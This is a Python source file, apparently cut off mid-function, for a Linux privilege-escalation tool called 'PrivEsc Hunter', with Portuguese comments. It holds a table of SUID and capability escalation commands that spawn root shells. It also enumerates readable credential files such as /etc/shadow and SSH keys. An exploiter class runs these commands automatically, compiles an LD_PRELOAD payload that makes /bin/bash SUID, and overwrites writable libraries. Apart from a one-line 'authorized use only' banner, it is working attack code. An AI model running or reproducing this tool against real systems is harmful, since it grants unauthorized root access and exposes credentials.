#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║          PrivEsc Hunter v1.0 — by homosapiens            ║
║   Intelligent Linux Privilege Escalation Framework       ║
║   Suporte: x86_64 e i686/i386 (detecção automática)     ║
║   APENAS PARA USO EM SISTEMAS AUTORIZADOS                ║
╚══════════════════════════════════════════════════════════╝
"""

import os, sys, platform, subprocess, struct, stat, re
import shutil, tempfile, binascii, socket, ctypes, ctypes.util
import glob
from pathlib import Path
from datetime import datetime

# ══════════════════════════════════════════════════════════
#  CORES — ANSI
# ══════════════════════════════════════════════════════════
RST  = '\033[0m'
BOLD = '\033[1m'
DIM  = '\033[2m'
RED  = '\033[91m'
YEL  = '\033[93m'
GRN  = '\033[92m'
CYN  = '\033[96m'
MAG  = '\033[95m'
WHT  = '\033[97m'

def red(s):   return f"{BOLD}{RED}{s}{RST}"
def yel(s):   return f"{BOLD}{YEL}{s}{RST}"
def grn(s):   return f"{BOLD}{GRN}{s}{RST}"
def cyn(s):   return f"{BOLD}{CYN}{s}{RST}"
def mag(s):   return f"{BOLD}{MAG}{s}{RST}"
def dim(s):   return f"{DIM}{s}{RST}"
def bold(s):  return f"{BOLD}{s}{RST}"

def section(title):
    bar = '═' * 58
    print(f"\n{BOLD}{CYN}{bar}{RST}")
    print(f"{BOLD}{CYN}  ◈  {title}{RST}")
    print(f"{BOLD}{CYN}{bar}{RST}")

def finding(level, label, value=""):
    icons = {
        'CRIT': red('[!!!]'),
        'HIGH': red('[!! ]'),
        'MED':  yel('[ ! ]'),
        'INFO': grn('[ + ]'),
        'DIM':  dim('[ - ]'),
    }
    icon = icons.get(level, grn('[ + ]'))
    val  = f": {value}" if value else ""
    print(f"  {icon} {bold(label)}{val}")

BANNER = f"""
{BOLD}{RED}
 ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
 ██╔══██╗██╔══██╗██║╚██╗ ██╔╝██╔════╝██╔════╝██╔════╝
 ██████╔╝██████╔╝██║ ╚████╔╝ █████╗  ███████╗██║
 ██╔═══╝ ██╔══██╗██║  ╚██╔╝  ██╔══╝  ╚════██║██║
 ██║     ██║  ██║██║   ██║   ███████╗███████║╚██████╗
 ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚══════╝ ╚═════╝{RST}
{BOLD}{YEL}        PrivEsc Hunter v1.0  —  by homosapiens{RST}
{DIM}        Intelligent Linux Privilege Escalation Framework{RST}
"""

# ══════════════════════════════════════════════════════════
#  GTFOBINS DATABASE — SUID exploits
# ══════════════════════════════════════════════════════════
# formato: nome → (comando_de_exploit | None, descrição)
# None = exploitável mas requer interação ou técnica específica
GTFOBINS_SUID = {
    'python':   ("python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                 "setuid(0) + exec /bin/bash"),
    'python3':  ("python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                 "setuid(0) + exec /bin/bash"),
    'python2':  ("python2 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                 "setuid(0) + exec /bin/bash"),
    'perl':     ("perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
                 "POSIX::setuid(0) + exec"),
    'ruby':     ("ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
                 "Process::Sys.setuid(0) + exec"),
    'bash':     ("/bin/bash -p",
                 "-p preserva EUID root"),
    'sh':       ("/bin/sh -p",
                 "-p preserva EUID root"),
    'dash':     ("/bin/dash -p",
                 "-p preserva EUID root"),
    'zsh':      ("/bin/zsh -p",
                 "-p preserva EUID root"),
    'find':     ("find / -name '.' -exec /bin/bash -p \\; -quit 2>/dev/null",
                 "find -exec /bin/bash -p"),
    'awk':      ("awk 'BEGIN {setuid(0); system(\"/bin/bash\")}'",
                 "awk setuid(0) + system"),
    'nawk':     ("nawk 'BEGIN {setuid(0); system(\"/bin/bash\")}'",
                 "nawk setuid(0) + system"),
    'gawk':     ("gawk 'BEGIN {setuid(0); system(\"/bin/bash\")}'",
                 "gawk setuid(0) + system"),
    'env':      ("env /bin/bash -p",
                 "env exec bash -p"),
    'nice':     ("nice /bin/bash -p",
                 "nice exec bash -p"),
    'strace':   ("strace -o /dev/null /bin/bash -p",
                 "strace exec bash -p"),
    'time':     ("/usr/bin/time /bin/bash -p",
                 "time exec bash -p"),
    'lua':      ("lua -e 'os.execute(\"/bin/bash -p\")'",
                 "lua os.execute"),
    'lua5.1':   ("lua5.1 -e 'os.execute(\"/bin/bash -p\")'",
                 "lua5.1 os.execute"),
    'tclsh':    ("echo 'exec /bin/bash -p' | tclsh",
                 "tclsh exec bash"),
    'node':     ("node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'",
                 "node setuid(0) + spawn"),
    'php':      ("php -r 'posix_setuid(0); system(\"/bin/bash\");'",
                 "php posix_setuid(0) + system"),
    'php7.0':   ("php7.0 -r 'posix_setuid(0); system(\"/bin/bash\");'",
                 "php posix_setuid(0) + system"),
    'php7.4':   ("php7.4 -r 'posix_setuid(0); system(\"/bin/bash\");'",
                 "php posix_setuid(0) + system"),
    'php8.0':   ("php8.0 -r 'posix_setuid(0); system(\"/bin/bash\");'",
                 "php posix_setuid(0) + system"),
    'tar':      ("tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
                 "tar --checkpoint-action exec"),
    'chmod':    ("chmod u+s /bin/bash",
                 "chmod 4755 /bin/bash → bash -p"),
    'chown':    ("chown root:root /bin/bash && chmod u+s /bin/bash",
                 "chown+chmod SUID bash"),
    'at':       ("echo 'chmod u+s /bin/bash' | at now",
                 "at job executa como root"),
    'rsync':    ("rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
                 "rsync rsh shell"),
    'nmap':     ("nmap --interactive",
                 "nmap --interactive (versões < 5.21)"),
    'vim':      ("vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'",
                 "vim python3 setuid"),
    'vi':       ("vi -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'",
                 "vi python3 setuid"),
    'base64':   (None,
                 "base64 pode ler /etc/shadow → base64 /etc/shadow | base64 -d"),
    'xxd':      (None,
                 "xxd pode ler/escrever arquivos arbitrários"),
    'cp':       (None,
                 "cp pode sobrescrever /etc/passwd ou chaves SSH"),
    'mv':       (None,
                 "mv pode mover arquivos de root"),
    'tee':      (None,
                 "tee pode sobrescrever /etc/sudoers"),
    'dd':       (None,
                 "dd pode sobrescrever partições ou arquivos"),
    'openssl':  (None,
                 "openssl enc pode ler arquivos arbitrários"),
    'curl':     (None,
                 "curl file:// pode exfiltrar /etc/shadow"),
    'wget':     (None,
                 "wget -O pode sobrescrever arquivos"),
    'ssh':      (None,
                 "ssh ProxyCommand pode executar comandos arbitrários"),
    'git':      (None,
                 "git hooks podem executar código"),
    'ftp':      (None,
                 "ftp shell interativo → !/bin/bash"),
    'less':     (None,
                 "less pager → !/bin/bash"),
    'more':     (None,
                 "more pager → !/bin/bash"),
    'man':      (None,
                 "man pager → !/bin/bash"),
    'zip':      (None,
                 "zip -TT pode executar comandos"),
    'pkexec':   (None,
                 "CVE-2021-4034 PwnKit — verificar versão do policykit"),
    'sudo':     (None,
                 "verificar sudo -l para regras exploráveis"),
    'procmail': (None,
                 "procmail SUID — verificar CVEs históricos"),
    'pppd':     (None,
                 "pppd SUID — CVE-2020-8597 (se não patchado)"),
    'sensible-mda': (None,
                 "sensible-mda SUID — verificar exploit chain"),
}

# Capabilities → comandos de exploração por binário
CAPS_EXPLOITS = {
    'cap_setuid': {
        'python3': "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        'python':  "python  -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        'python2': "python2 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        'perl':    "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
        'ruby':    "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
        'node':    "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'",
        'php':     "php -r 'posix_setuid(0); system(\"/bin/bash\");'",
    },
    'cap_dac_read_search': {
        '*': "Leitura irrestrita de arquivos — tente: cat /etc/shadow",
    },
    'cap_sys_admin': {
        '*': "cap_sys_admin ≈ root — múltiplos vetores de escalonamento",
    },
    'cap_chown': {
        '*': "Pode mudar ownership: chown root:root /bin/bash && chmod u+s /bin/bash",
    },
    'cap_sys_ptrace': {
        '*': "ptrace injection em processos root — use inject.py",
    },
    'cap_net_raw': {
        '*': "Captura de rede — possível sniffing de credenciais em texto claro",
    },
}

# ══════════════════════════════════════════════════════════
#  SISTEMA — detecção de arquitetura e ferramentas
# ══════════════════════════════════════════════════════════
class System:
    def __init__(self):
        raw_arch      = platform.machine().lower()
        self.arch     = platform.machine()
        self.is64     = raw_arch in ('x86_64', 'amd64')
        self.is32     = raw_arch in ('i386', 'i486', 'i586', 'i686')
        self.elf_bits = 64 if self.is64 else 32
        self.kernel   = platform.release()
        self.distro   = self._get_distro()
        self.uid      = os.getuid()
        self.euid     = os.geteuid()
        self.user     = os.environ.get('USER', os.environ.get('LOGNAME', 'unknown'))
        self.home     = os.environ.get('HOME', '/tmp')
        self.path_env = os.environ.get('PATH', '').split(':')
        self.ld_pre   = os.environ.get('LD_PRELOAD', '')
        self.has_gcc  = bool(shutil.which('gcc'))
        self.has_cc   = bool(shutil.which('cc'))
        self.has_py3  = bool(shutil.which('python3'))
        self.has_py2  = bool(shutil.which('python') or shutil.which('python2'))
        self.gcc_bin  = shutil.which('gcc') or shutil.which('cc') or None

    def _get_distro(self):
        try:
            with open('/etc/os-release') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME'):
                        return line.split('=', 1)[1].strip().strip('"')
        except Exception:
            pass
        return platform.system()

    def run(self, cmd, timeout=15):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=timeout)
            return r.stdout.strip()
        except Exception:
            return ""

    def is_root(self):
        return os.getuid() == 0 or os.geteuid() == 0

# ══════════════════════════════════════════════════════════
#  ENUMERAÇÃO
# ══════════════════════════════════════════════════════════
class Enumerator:
    def __init__(self, sys_obj: System):
        self.s = sys_obj
        self.r = {}   # results dict

    # ── Sistema ──────────────────────────────────────────
    def enum_system(self):
        section("INFORMAÇÕES DO SISTEMA")
        s = self.s
        finding('INFO', 'Arquitetura',
                f"{s.arch}  ({s.elf_bits}-bit)")
        finding('INFO', 'Kernel',     s.kernel)
        finding('INFO', 'Distro',     s.distro)
        finding('INFO', 'Usuário',    f"{s.user}  uid={s.uid}  euid={s.euid}")
        finding('INFO', 'GCC',
                grn('disponível') if (s.has_gcc or s.has_cc) else yel('ausente'))
        finding('INFO', 'Python3',
                grn('disponível') if s.has_py3 else yel('ausente'))
        if s.ld_pre:
            finding('HIGH', 'LD_PRELOAD setado no ambiente', red(s.ld_pre))
        self.r['system'] = {
            'arch': s.arch, 'bits': s.elf_bits,
            'kernel': s.kernel, 'distro': s.distro,
            'uid': s.uid, 'ld_preload': s.ld_pre,
        }

    # ── SUID ─────────────────────────────────────────────
    def enum_suid(self):
        section("BINÁRIOS SUID")
        out = self.s.run("find / -perm -4000 -type f 2>/dev/null")
        bins = [l.strip() for l in out.splitlines() if l.strip()]

        known, unknown, custom = [], [], []
        std_paths = ('/bin/', '/usr/bin/', '/sbin/', '/usr/sbin/',
                     '/usr/lib/', '/lib/')

        for b in bins:
            name = os.path.basename(b)
            if name in GTFOBINS_SUID:
                cmd, desc = GTFOBINS_SUID[name]
                level = 'CRIT' if cmd else 'HIGH'
                finding(level, b, yel(desc))
                known.append(b)
            else:
                is_std = any(b.startswith(p) for p in std_paths)
                if not is_std:
                    finding('HIGH', b, red("FORA DO PATH PADRÃO — binário custom/suspeito"))
                    custom.append(b)
                else:
                    finding('DIM', b, dim("sem entry GTFOBins"))
                    unknown.append(b)

        self.r['suid_known']  = known
        self.r['suid_custom'] = custom
        self.r['suid_all']    = bins
        return known, custom

    # ── Sudo ─────────────────────────────────────────────
    def enum_sudo(self):
        section("SUDO")
        out = self.s.run("sudo -l 2>&1")
        if not out or 'no tty' in out.lower() or 'no askpass' in out.lower():
            finding('MED', 'sudo -l', yel("Requer TTY — execute num PTY completo"))
            self.r['sudo'] = None
            return None
        if 'not allowed' in out.lower() or 'unknown' in out.lower():
            finding('DIM', 'sudo', dim("Sem permissões sudo"))
            self.r['sudo'] = None
            return None
        finding('HIGH', 'sudo -l:', '')
        for line in out.splitlines():
            lvl = 'CRIT' if 'NOPASSWD' in line else 'INFO'
            finding(lvl, '  ' + line.strip(), '')
        self.r['sudo'] = out
        return out

    # ── Capabilities ─────────────────────────────────────
    def enum_capabilities(self):
        section("CAPABILITIES")
        out = self.s.run("getcap -r / 2>/dev/null")
        caps = []
        if not out:
            finding('DIM', 'Capabilities', dim("Nenhuma encontrada"))
            self.r['caps'] = []
            return []
        for line in out.splitlines():
            if not line.strip():
                continue
            parts = line.split()
            binary  = parts[0]
            cap_str = parts[-1] if len(parts) > 1 else ''
            crit_caps = ['cap_setuid', 'cap_sys_admin', 'cap_dac', 'cap_chown']
            level = 'CRIT' if any(c in cap_str for c in crit_caps) else 'MED'
            finding(level, binary, yel(cap_str))
            caps.append((binary, cap_str))
        self.r['caps'] = caps
        return caps

    # ── Cron ─────────────────────────────────────────────
    def enum_cron(self):
        section("CRON JOBS")
        cron_sources = [
            '/etc/crontab',
            '/etc/cron.d/*',
            '/var/spool/cron/crontabs/*',
        ]
        cron_dirs = [
            '/etc/cron.hourly',
            '/etc/cron.daily',
            '/etc/cron.weekly',
            '/etc/cron.monthly',
        ]
        writable = []

        for pattern in cron_sources:
            for f in glob.glob(pattern):
                try:
                    content = open(f).read()
                    lines = [l for l in content.splitlines()
                             if l.strip() and not l.strip().startswith('#')]
                    if lines:
                        finding('INFO', f'Cron: {f}', '')
                        for l in lines:
                            print(f"    {dim(l)}")
                        # verifica scripts referenciados que sejam graváveis
                        for l in lines:
                            parts = l.split()
                            for p in parts:
                                if p.startswith('/') and os.path.isfile(p):
                                    if os.access(p, os.W_OK):
                                        finding('CRIT', f'Script de cron GRAVÁVEL',
                                                red(p))
                                        writable.append(p)
                except Exception:
                    pass

        for d in cron_dirs:
            if not os.path.isdir(d):
                continue
            try:
                for fname in os.listdir(d):
                    fpath = os.path.join(d, fname)
                    if os.path.isfile(fpath) and os.access(fpath, os.W_OK):
                        finding('CRIT', f'Script de cron GRAVÁVEL', red(fpath))
                        writable.append(fpath)
            except Exception:
                pass

        if not writable:
            finding('DIM', 'Cron', dim("Nenhum script gravável encontrado"))

        self.r['cron_writable'] = writable
        return writable

    # ── LD_PRELOAD ───────────────────────────────────────
    def enum_ld_preload(self):
        section("LD_PRELOAD / LD_LIBRARY_PATH")
        vectors = []
        ld = self.s.ld_pre

        if ld:
            finding('HIGH', 'LD_PRELOAD no ambiente', red(ld))
            if os.path.isfile(ld) and os.access(ld, os.W_OK):
                finding('CRIT', 'Arquivo LD_PRELOAD GRAVÁVEL!',
                        red(ld) + ' → substituição direta possível')
                vectors.append(('env_writable', ld))
            else:
                vectors.append(('env', ld))

        # sudo com env_keep += LD_PRELOAD
        sudo_out = self.r.get('sudo') or ''
        if sudo_out and 'LD_PRELOAD' in sudo_out:
            finding('CRIT', 'sudo preserva LD_PRELOAD!',
                    red('env_keep += LD_PRELOAD detectado no sudoers'))
            vectors.append(('sudo_env_keep', sudo_out))

        # /etc/ld.so.conf.d — diretório gravável
        for pattern in ('/etc/ld.so.conf', '/etc/ld.so.conf.d/*'):
            for f in glob.glob(pattern):
                try:
                    for line in open(f):
                        d = line.strip()
                        if d and not d.startswith('#') and os.path.isdir(d):
                            if os.access(d, os.W_OK):
                                finding('CRIT', f'ld.so.conf dir GRAVÁVEL', red(d))
                                vectors.append(('ldconf_dir', d))
                except Exception:
                    pass

        if not vectors:
            finding('DIM', 'LD_PRELOAD', dim("Sem vetores encontrados"))

        self.r['ld_preload'] = vectors
        return vectors

    # ── PATH hijacking ───────────────────────────────────
    def enum_path(self):
        section("PATH HIJACKING")
        writable = []
        for d in self.s.path_env:
            if not d or not os.path.isdir(d):
                continue
            if os.access(d, os.W_OK):
                finding('CRIT', f'Diretório PATH GRAVÁVEL', red(d))
                writable.append(d)
            else:
                finding('DIM', d, dim("sem escrita"))
        if not writable:
            finding('DIM', 'PATH', dim("Sem diretórios graváveis"))
        self.r['writable_paths'] = writable
        return writable

    # ── Processos root ───────────────────────────────────
    def enum_procs(self):
        section("PROCESSOS ROOT INTERESSANTES")
        out = self.s.run("ps aux 2>/dev/null")
        interesting = []
        keywords = ['python', 'ruby', 'perl', 'java', 'php',
                    'tomcat', 'mysql', 'postgres', 'redis',
                    'nginx', 'apache', 'node', 'bash', 'sh']
        for line in out.splitlines():
            if 'root' not in line.split()[:2]:
                continue
            if any(kw in line for kw in keywords):
                finding('MED', 'Processo root', yel(line.strip()[:110]))
                interesting.append(line.strip())
        if not interesting:
            finding('DIM', 'Processos', dim("Nada de especial rodando como root"))
        self.r['root_procs'] = interesting
        return interesting

    # ── Serviços locais ──────────────────────────────────
    def enum_network(self):
        section("SERVIÇOS LOCAIS (LOCALHOST)")
        out = self.s.run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
        local = []
        for line in out.splitlines():
            if '127.0.0.1' in line or '::1' in line:
                finding('MED', 'Serviço local', yel(line.strip()[:100]))
                local.append(line.strip())
        if not local:
            finding('DIM', 'Rede', dim("Sem serviços apenas em localhost"))
        self.r['local_services'] = local
        return local

    # ── Arquivos sensíveis ───────────────────────────────
    def enum_sensitive(self):
        section("ARQUIVOS SENSÍVEIS / CREDENCIAIS")
        targets = [
            '/etc/shadow',
            '/root/.ssh/id_rsa',
            '/root/.ssh/id_ed25519',
            '/root/.bash_history',
            '/root/.mysql_history',
        ]
        patterns = [
            '/home/*/.ssh/id_rsa',
            '/home/*/.ssh/id_ed25519',
            '/home/*/.bash_history',
            '/home/*/.pgpass',
            '/var/www/*/wp-config.php',
            '/opt/*/conf/*.properties',
            '/opt/*/conf/tomcat-users.xml',
            '/opt/*/webapps/*/WEB-INF/web.xml',
        ]
        readable = []
        for t in targets:
            if os.path.isfile(t) and os.access(t, os.R_OK):
                finding('HIGH', f'Legível: {t}', red('arquivo sensível acessível!'))
                readable.append(t)
        for p in patterns:
            for f in glob.glob(p):
                if os.access(f, os.R_OK):
                    finding('MED', f'Legível: {f}', yel('arquivo potencialmente sensível'))
                    readable.append(f)
        if not readable:
            finding('DIM', 'Arquivos sensíveis', dim("Nenhum legível"))
        self.r['readable_sensitive'] = readable
        return readable

    # ── Kernel modules ───────────────────────────────────
    def enum_kernel(self):
        section("MÓDULOS DO KERNEL")
        out = self.s.run("lsmod 2>/dev/null | head -30")
        sig = self.s.run("cat /proc/sys/kernel/modules_disabled 2>/dev/null")
        enforce = self.s.run("grep -r 'sig' /proc/sys/kernel/module* 2>/dev/null | head -5")
        if sig == '0' or not sig:
            finding('MED', 'Módulos carregáveis', yel('Sem enforcement de assinatura'))
        else:
            finding('DIM', 'Módulos', dim(f"sig enforcement: {sig}"))
        # namespace não-privilegiado (útil pra exploits)
        ns = self.s.run("cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null")
        if ns == '1':
            finding('MED', 'User namespaces não-privilegiados',
                    yel('habilitados (útil para vários exploits de kernel)'))
        self.r['kernel_ns'] = ns

    def run_all(self):
        self.enum_system()
        self.enum_suid()
        self.enum_sudo()
        self.enum_capabilities()
        self.enum_cron()
        self.enum_ld_preload()
        self.enum_path()
        self.enum_procs()
        self.enum_network()
        self.enum_sensitive()
        self.enum_kernel()
        return self.r

# ══════════════════════════════════════════════════════════
#  ANALISADOR — score e priorização de vetores
# ══════════════════════════════════════════════════════════
class Analyzer:
    SCORE = {
        'sudo_nopasswd':     95,
        'suid_exec':         90,
        'cap_setuid':        90,
        'cap_sys_admin':     88,
        'ld_preload_writable':85,
        'ld_preload_sudo':   83,
        'cron_writable':     80,
        'cap_dac_read':      72,
        'suid_manual':       70,
        'suid_custom':       68,
        'path_hijack':       65,
        'copy_fail_cve':     60,
        'shadow_readable':   55,
    }

    def __init__(self, results: dict, sys_obj: System):
        self.r       = results
        self.s       = sys_obj
        self.vectors = []

    def analyze(self):
        section("ANÁLISE E PRIORIZAÇÃO DE VETORES")
        r = self.r

        # sudo NOPASSWD
        sudo_out = r.get('sudo') or ''
        if sudo_out and 'NOPASSWD' in sudo_out:
            for line in sudo_out.splitlines():
                if 'NOPASSWD' in line:
                    self.vectors.append({
                        'type': 'sudo_nopasswd',
                        'score': self.SCORE['sudo_nopasswd'],
                        'line': line.strip(),
                    })
                    finding('CRIT', f"[{self.SCORE['sudo_nopasswd']}] sudo NOPASSWD",
                            yel(line.strip()))

        # SUID com exploit direto
        for b in r.get('suid_known', []):
            name = os.path.basename(b)
            cmd, desc = GTFOBINS_SUID.get(name, (None, ''))
            if cmd:
                sc = self.SCORE['suid_exec']
                self.vectors.append({
                    'type': 'suid_exec', 'score': sc,
                    'binary': b, 'cmd': cmd, 'desc': desc,
                })
                finding('CRIT', f"[{sc}] SUID GTFOBins exec",
                        f"{b}  →  {yel(desc)}")
            else:
                sc = self.SCORE['suid_manual']
                self.vectors.append({
                    'type': 'suid_manual', 'score': sc,
                    'binary': b, 'cmd': None, 'desc': desc,
                })
                finding('HIGH', f"[{sc}] SUID manual",
                        f"{b}  —  {dim(desc)}")

        # SUID custom
        for b in r.get('suid_custom', []):
            sc = self.SCORE['suid_custom']
            self.vectors.append({
                'type': 'suid_custom', 'score': sc,
                'binary': b, 'cmd': None,
            })
            finding('HIGH', f"[{sc}] SUID custom",
                    red(b) + "  ← investigue")

        # Capabilities
        for binary, cap_str in r.get('caps', []):
            name = os.path.basename(binary)
            if 'cap_setuid' in cap_str:
                sc = self.SCORE['cap_setuid']
                exploit_cmd = (CAPS_EXPLOITS.get('cap_setuid', {}).get(name)
                               or CAPS_EXPLOITS['cap_setuid'].get('python3'))
                self.vectors.append({
                    'type': 'cap_setuid', 'score': sc,
                    'binary': binary, 'cmd': exploit_cmd, 'cap': cap_str,
                })
                finding('CRIT', f"[{sc}] cap_setuid", f"{binary}  {yel(cap_str)}")
            elif 'cap_sys_admin' in cap_str:
                sc = self.SCORE['cap_sys_admin']
                self.vectors.append({
                    'type': 'cap_sys_admin', 'score': sc,
                    'binary': binary, 'cap': cap_str,
                })
                finding('CRIT', f"[{sc}] cap_sys_admin", binary)
            elif 'cap_dac_read_search' in cap_str:
                sc = self.SCORE['cap_dac_read']
                self.vectors.append({
                    'type': 'cap_dac_read', 'score': sc,
                    'binary': binary, 'cap': cap_str,
                })
                finding('HIGH', f"[{sc}] cap_dac_read_search", binary)
            elif 'cap_chown' in cap_str:
                sc = self.SCORE['cap_setuid']
                self.vectors.append({
                    'type': 'cap_chown', 'score': sc,
                    'binary': binary, 'cap': cap_str,
                })
                finding('CRIT', f"[{sc}] cap_chown", binary)

        # LD_PRELOAD
        for kind, val in r.get('ld_preload', []):
            if kind == 'env_writable':
                sc = self.SCORE['ld_preload_writable']
                self.vectors.append({
                    'type': 'ld_preload_writable', 'score': sc, 'path': val,
                })
                finding('CRIT', f"[{sc}] LD_PRELOAD gravável",
                        red(val))
            elif kind == 'sudo_env_keep':
                sc = self.SCORE['ld_preload_sudo']
                self.vectors.append({
                    'type': 'ld_preload_sudo', 'score': sc,
                })
                finding('CRIT', f"[{sc}] sudo env_keep LD_PRELOAD",
                        red("exploitável via sudo"))

        # Cron
        for f in r.get('cron_writable', []):
            sc = self.SCORE['cron_writable']
            self.vectors.append({
                'type': 'cron_writable', 'score': sc, 'path': f,
            })
            finding('CRIT', f"[{sc}] Cron script gravável", red(f))

        # /etc/shadow
        if '/etc/shadow' in r.get('readable_sensitive', []):
            sc = self.SCORE['shadow_readable']
            self.vectors.append({
                'type': 'shadow_readable', 'score': sc, 'path': '/etc/shadow',
            })
            finding('HIGH', f"[{sc}] /etc/shadow legível",
                    red("→ hashcat / john --format=sha512crypt"))

        # PATH hijacking
        for d in r.get('writable_paths', []):
            sc = self.SCORE['path_hijack']
            self.vectors.append({
                'type': 'path_hijack', 'score': sc, 'dir': d,
            })
            finding('HIGH', f"[{sc}] PATH hijacking", red(d))

        # CVE-2026-31431 Copy Fail (fallback)
        sc = self.SCORE['copy_fail_cve']
        self.vectors.append({
            'type': 'copy_fail_cve', 'score': sc,
            'arch': self.s.arch, 'bits': self.s.elf_bits,
        })
        finding('MED', f"[{sc}] CVE-2026-31431 Copy Fail",
                f"arch={self.s.arch} (fallback — pode corromper binários!)")

        self.vectors.sort(key=lambda x: x['score'], reverse=True)

        total = len(self.vectors)
        print(f"\n  {bold('Vetores encontrados:')} "
              f"{(red if total > 0 else dim)(str(total))}")
        return self.vectors

# ══════════════════════════════════════════════════════════
#  EXPLOITER — execução inteligente por tipo de vetor
# ══════════════════════════════════════════════════════════
class Exploiter:
    def __init__(self, sys_obj: System):
        self.s         = sys_obj
        self.got_root  = False
        self.tmpdir    = tempfile.mkdtemp(prefix='.pe_', dir='/tmp')

    def _is_root(self):
        return os.getuid() == 0 or os.geteuid() == 0

    def _bash_is_suid(self):
        try:
            return bool(os.stat('/bin/bash').st_mode & stat.S_ISUID)
        except Exception:
            return False

    def _success(self, method):
        print(f"\n  {red('='*56)}")
        print(f"  {red('[ROOT]')}  {bold(method)}")
        print(f"  {red('='*56)}")
        self.got_root = True
        return True

    def _post_check(self, method):
        if self._is_root():
            return self._success(f"Root direto via {method}")
        if self._bash_is_suid():
            print(f"\n  {red('[ROOT]')} {bold('/bin/bash agora tem SUID!')}")
            print(f"  {grn('Execute:')} /bin/bash -p")
            return self._success(f"bash SUID via {method}")
        return False

    # ── SUID GTFOBins ─────────────────────────────────────
    def exploit_suid(self, v: dict):
        binary = v.get('binary', '')
        cmd    = v.get('cmd', '')
        desc   = v.get('desc', '')
        if not cmd or not os.path.exists(binary):
            return False
        print(f"\n  {yel('[*]')} SUID exploit: {bold(binary)}")
        print(f"  {yel('[*]')} Técnica:  {desc}")
        print(f"  {yel('[*]')} Comando:  {dim(cmd)}")
        try:
            res = subprocess.run(cmd, shell=True, timeout=8,
                                 capture_output=True, text=True)
            if self._post_check(f"SUID/{os.path.basename(binary)}"):
                return True
            # Tenta via payload chmod
            chmod_cmd = f"{binary} -c 'chmod u+s /bin/bash' 2>/dev/null"
            subprocess.run(chmod_cmd, shell=True, timeout=5,
                           capture_output=True)
            return self._post_check(f"SUID/{os.path.basename(binary)}")
        except subprocess.TimeoutExpired:
            print(f"  {yel('[!]')} Timeout — shell interativo aberto?")
            os.system(cmd)
            return self._post_check(f"SUID/{os.path.basename(binary)}")
        except Exception as e:
            print(f"  {dim('[-]')} Falhou: {e}")
            return False

    # ── Capability cap_setuid ────────────────────────────
    def exploit_cap_setuid(self, v: dict):
        binary = v.get('binary', '')
        cmd    = v.get('cmd', '')
        if not cmd or not os.path.exists(binary):
            return False
        print(f"\n  {yel('[*]')} cap_setuid exploit: {bold(binary)}")
        print(f"  {yel('[*]')} Comando: {dim(cmd)}")
        try:
            subprocess.run(cmd, shell=True, timeout=8, capture_output=True)
            return self._post_check(f"cap_setuid/{os.path.basename(binary)}")
        except Exception as e:
            print(f"  {dim('[-]')} Falhou: {e}")
            return False

    # ── LD_PRELOAD (arquivo gravável) ────────────────────
    def exploit_ld_preload_file(self, v: dict):
        path = v.get('path', '')
        if not path or not os.access(path, os.W_OK):
            return False
        if not (self.s.has_gcc or self.s.has_cc):
            print(f"  {yel('[!]')} gcc/cc ausente — não é possível compilar payload")
            return False

        print(f"\n  {yel('[*]')} LD_PRELOAD exploit: substituindo {red(path)}")

        src  = os.path.join(self.tmpdir, 'payload.c')
        arch_flag = '' if self.s.is64 else '-m32'
        c_code = (
            '#include <sys/stat.h>\n'
            '#include <unistd.h>\n'
            '#include <stdlib.h>\n'
            'void __attribute__((constructor)) _privesc(){\n'
            '    unsetenv("LD_PRELOAD");\n'
            '    setuid(0); setgid(0);\n'
            '    chmod("/bin/bash", 04755);\n'
            '}\n'
        )
        try:
            with open(src, 'w') as f:
                f.write(c_code)
            gcc = self.s.gcc_bin or 'gcc'
            ret = os.system(
                f"{gcc} {arch_flag} -shared -fPIC -nostartfiles "
                f"-o {path} {src} 2>/dev/null"
            )
            if ret != 0:
                print(f"  {dim('[-]')} Compilação falhou")
                return False
            print(f"  {grn('[+]')} Payload compilado e escrito em {path}")
            print(f"  {yel('[*]')} Aguardando processo root carregar a lib...")
            return True  # verificação posterior
        except Exception as e:
            print(f"  {dim('[-]')} Erro: {e}")
            return False

    # ── LD_PRELOAD via sudo env_keep ─────────────────────
    def exploit_ld_preload_sudo(self, v: dict):
        if not (self.s.has_gcc or self.s.has_cc):
            print(f"  {yel('[!]')} gcc ausente")
            return False

        src = os.path.join(self.tmpdir, 'payload.c')
        lib = os.path.join(self.tmpdir, 'payload.so')
        arch_flag = '' if self.s.is64 else '-m32'
        c_code = (
            '#include <sys/stat.h>\n'
            '#include <unistd.h>\n'
            '#include <stdlib.h>\n'
            'void __attribute__((constructor)) _privesc(){\n'
            '    unsetenv("LD_PRELOAD");\n'
            '    setuid(0); setgid(0);\n'
            '    chmod("/bin/bash", 04755);\n'
            '}\n'
        )
        try:
            with open(src, 'w') as f:
                f.write(c_code)
            gcc = self.s.gcc_bin or 'gcc'
            ret = os.system(
                f"{gcc} {arch_flag} -shared -fPIC -nostartfiles "
                f"-o {lib} {src} 2>/dev/null"
